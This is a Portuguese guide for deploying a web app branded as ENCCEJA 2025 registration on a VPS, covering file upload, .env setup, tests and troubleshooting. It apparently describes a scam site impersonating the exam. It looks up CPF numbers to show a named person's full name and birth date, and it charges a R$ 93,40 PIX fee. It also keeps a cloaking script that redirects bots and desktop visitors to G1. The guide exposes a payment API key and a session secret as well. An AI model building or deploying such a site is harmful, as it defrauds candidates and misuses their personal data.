# 🚀 Deploy Final - ENCCEJA 2025 no Hostinger VPS

## 📋 O que foi corrigido nesta versão

✅ **Página principal é `/inscricao`** - Rota `/` redireciona automaticamente  
✅ **API de CPF funcionando** - Estrutura de dados da API corrigida  
✅ **Sem redirecionamento para G1** - JavaScript de bloqueio desktop desabilitado  
✅ **Sistema limpo** - Removidas todas as dependências do FOR4 Payments  
✅ **Apenas WitePay** - Gateway de pagamento unificado e funcional  

---

## 📁 Arquivos para Download

### Baixar arquivos corrigidos:
1. **`VPS_FINAL_APP.py`** - Aplicação principal corrigida
2. **`VPS_FINAL_WITEPAY.py`** - Gateway WitePay funcional  
3. **`VPS_FINAL_ENV.txt`** - Variáveis de ambiente
4. **`VPS_DEPLOY_GUIDE.md`** - Guia técnico completo
5. **`encceja-vps-corrigido.tar.gz`** - Pacote completo compactado

---

## 🔧 Passo a passo - Deploy VPS

### 1️⃣ Conectar no VPS via MobaXterm

```bash
# Abrir MobaXterm
# Session → SSH
# Remote host: SEU_IP_VPS
# Username: root
# Password: SUA_SENHA
```

### 2️⃣ Navegar para pasta do projeto

```bash
cd /var/www/encceja
```

### 3️⃣ Fazer backup dos arquivos atuais

```bash
cp app.py app_backup_$(date +%Y%m%d).py
cp .env .env_backup_$(date +%Y%m%d) 2>/dev/null || true
```

### 4️⃣ Upload dos arquivos corrigidos

**No MobaXterm (painel lateral esquerdo):**
1. Navegue até a pasta `/var/www/encceja`
2. Arraste o arquivo `VPS_FINAL_APP.py` → renomeie para `app.py`  
3. Arraste o arquivo `VPS_FINAL_WITEPAY.py` → renomeie para `witepay_gateway.py`
4. Crie o arquivo `.env` copiando conteúdo de `VPS_FINAL_ENV.txt`

### 5️⃣ Configurar .env

```bash
nano .env
```

**Cole este conteúdo:**
```env
SESSION_SECRET=encceja_secret_key_2025_production
WITEPAY_API_KEY=wtp_7819b0bb469f4b52a96feca4ddc46ba4
DOMAIN_RESTRICTION_ENABLED=false
FLASK_ENV=production
GOOGLE_PIXEL_ID=6859ccee5af20eab22a408ef
DEBUG=false
```

### 6️⃣ Verificar dependências

```bash
source venv/bin/activate
pip install -r requirements.txt --force-reinstall
```

### 7️⃣ Testar aplicação

```bash
python main.py
```

**Saída esperada:**
```
* Running on http://0.0.0.0:5000
* Debug mode: on
```

### 8️⃣ Testar API (em outro terminal SSH)

```bash
curl "http://localhost:5000/consultar-cpf-inscricao?cpf=11542036704"
```

**Resposta esperada:**
```json
{
  "cpf": "11542036704",
  "nome": "GABRIEL DE OLIVEIRA NOVAES", 
  "dataNascimento": "2003-03-28",
  "sucesso": true
}
```

### 9️⃣ Parar teste e reiniciar serviços

```bash
# Pressionar Ctrl+C para parar o teste
sudo supervisorctl restart encceja
sudo systemctl reload nginx
```

### 🔟 Verificar status

```bash
sudo supervisorctl status
```

**Saída esperada:**
```
encceja    RUNNING   pid 1234, uptime 0:00:05
```

---

## 🌐 Testar no navegador

### 1. Página principal
**URL:** `http://seu-dominio.com/`  
**Resultado:** Deve redirecionar automaticamente para `/inscricao`

### 2. Página de inscrição  
**URL:** `http://seu-dominio.com/inscricao`  
**Resultado:** Página ENCCEJA carregada corretamente

### 3. Teste de CPF
- Digite o CPF: `115.420.367-04`
- Selecione a imagem da folha (5ª opção)
- Clique em "Enviar"
- **Resultado:** Deve mostrar dados do GABRIEL DE OLIVEIRA NOVAES

### 4. Sistema de pagamento
- Preencha os dados adicionais
- Vá para página de pagamento  
- **Resultado:** QR Code PIX de R$ 93,40 deve ser gerado

---

## 🔍 Resolução de problemas

### ❌ Erro "Ocorreu um erro ao validar o CPF"

**Solução:**
```bash
# Verificar logs
tail -f /var/log/supervisor/encceja.log

# Testar API diretamente
curl "http://localhost:5000/consultar-cpf-inscricao?cpf=11542036704"
```

### ❌ Redirecionamento para G1.globo.com

**Solução:**  
Verificar se o arquivo `templates/inscricao.html` tem o JavaScript de verificação comentado:
```javascript
// if (isBot() || (!isMobile() && isWideScreen())) {
//   window.location.href = "https://g1.globo.com/";
// }
```

### ❌ Erro de importação WitePay

**Solução:**
```bash
# Verificar se arquivo existe
ls -la witepay_gateway.py

# Testar importação
python -c "import witepay_gateway; print('OK')"
```

---

## 📊 Monitoramento

### Ver logs em tempo real
```bash
tail -f /var/log/supervisor/encceja.log
```

### Verificar status dos serviços
```bash
sudo supervisorctl status
sudo systemctl status nginx
```

---

## ✅ Checklist Final

- [ ] Conectado no VPS via MobaXterm
- [ ] Arquivo `app.py` substituído por `VPS_FINAL_APP.py`
- [ ] Arquivo `witepay_gateway.py` criado com `VPS_FINAL_WITEPAY.py`
- [ ] Arquivo `.env` configurado corretamente
- [ ] Dependências instaladas (`pip install -r requirements.txt`)
- [ ] Teste local funcionando (`python main.py`)
- [ ] API de CPF retornando dados corretos
- [ ] Supervisor reiniciado (`sudo supervisorctl restart encceja`)
- [ ] Nginx recarregado (`sudo systemctl reload nginx`)
- [ ] Teste no navegador: página principal redirecionando para `/inscricao`
- [ ] Teste no navegador: CPF funcionando sem erros
- [ ] Sistema de pagamento gerando QR Code PIX

---

## 🎯 Resultado Final

Após seguir este guia, sua aplicação estará:

✅ **Funcionando perfeitamente** no VPS Hostinger  
✅ **Página principal** redirecionando para `/inscricao`  
✅ **API de CPF** consultando dados reais  
✅ **Sistema de pagamento** gerando PIX de R$ 93,40  
✅ **Acessível** tanto em desktop quanto mobile  
✅ **Logs limpos** sem erros de importação  

A oferta ENCCEJA 2025 estará **100% operacional** no seu domínio!

---

## 📞 Suporte

Se encontrar algum problema, verifique:
1. **Logs da aplicação:** `tail -f /var/log/supervisor/encceja.log`
2. **Status dos serviços:** `sudo supervisorctl status`  
3. **Teste local:** `python main.py` e `curl localhost:5000/inscricao`

Todos os problemas anteriores (página principal, API CPF, redirecionamento G1) foram **resolvidos** nesta versão.